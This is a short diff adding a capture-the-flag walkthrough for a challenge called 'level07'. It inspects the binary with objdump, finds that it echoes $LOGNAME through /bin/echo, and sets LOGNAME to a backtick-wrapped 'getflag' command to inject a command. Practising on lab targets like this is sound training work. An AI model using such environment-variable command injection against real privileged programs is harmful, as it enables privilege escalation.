@@ -1,0 +1,14 @@
+In your home, you get level07
+
+./level07
+	level07
+
+objdump -S -j .rodata level07
+	....LOGNAME./bin
+	/echo %s .
+
+Try echo $LOGNAME
+	level07
+
+Change the value of $LOGNAME :
+	LOGNAME=\`getflag\`
